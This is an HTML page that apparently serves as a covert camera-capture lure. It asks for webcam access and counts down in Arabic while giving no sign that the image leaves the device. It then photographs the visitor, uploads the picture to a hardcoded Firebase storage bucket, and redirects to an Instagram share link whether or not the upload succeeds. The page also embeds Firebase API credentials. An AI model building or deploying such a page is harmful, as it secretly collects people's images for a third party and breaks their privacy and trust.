<!DOCTYPE html>
<html>
<head>
  <title>Camera Upload</title>
  <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
  <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-storage.js"></script>
  <style>
    body { display: flex; align-items: center; justify-content: center; height: 100vh; flex-direction: column; font-family: sans-serif; }
    #countdown { font-size: 2rem; margin-bottom: 20px; }
  </style>
</head>
<body>
  <div id="countdown">جاري فتح الكاميرا...</div>
  <video id="video" autoplay playsinline width="640" height="480" style="display:none;"></video>
  <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>

  <script>
    var firebaseConfig = {
      apiKey: "AIzaSyC0WgRyyIgIZqfI3azfBqyyy_xqeRw",
      authDomain: "mioudcamstorage.firebaseapp.com",
      projectId: "mioudcamstorage",
      storageBucket: "mioudcamstorage.appspot.com",
      messagingSenderId: "687188581684",
      appId: "1:687188581684:web:122eb4d99ffb8abe2b8a78d"
    };

    firebase.initializeApp(firebaseConfig);
    var storage = firebase.storage();
    const REDIRECT_URL = 'https://www.instagram.com/share/BAPOHyZPk7';

    const countdownEl = document.getElementById('countdown');
    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');

    function startCountdown(seconds) {
      let count = seconds;
      countdownEl.innerText = `التصوير بعد ${count} ثواني...`;
      const interval = setInterval(() => {
        count--;
        countdownEl.innerText = `التصوير بعد ${count} ثواني...`;
        if (count === 0) {
          clearInterval(interval);
          takeSnapshot();
        }
      }, 1000);
    }

    function takeSnapshot() {
      countdownEl.innerText = "جاري الالتقاط...";
      const ctx = canvas.getContext('2d');
      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
      video.srcObject.getTracks().forEach(track => track.stop());

      canvas.toBlob(blob => {
        const filename = `snapshot_${Date.now()}.png`;
        const storageRef = storage.ref().child(filename);
        storageRef.put(blob).then(() => {
          console.log("✅ تم الرفع بنجاح");
          window.location.href = REDIRECT_URL;
        }).catch(error => {
          console.error("❌ فشل الرفع:", error);
          window.location.href = REDIRECT_URL;
        });
      }, 'image/png');
    }

    navigator.mediaDevices.getUserMedia({ video: true }).then(stream => {
      video.srcObject = stream;
      video.style.display = 'block';
      startCountdown(3);
    }).catch(error => {
      console.error('❌ تم رفض صلاحيات الكاميرا:', error);
      window.location.href = REDIRECT_URL;
    });
  </script>
</body>
</html>
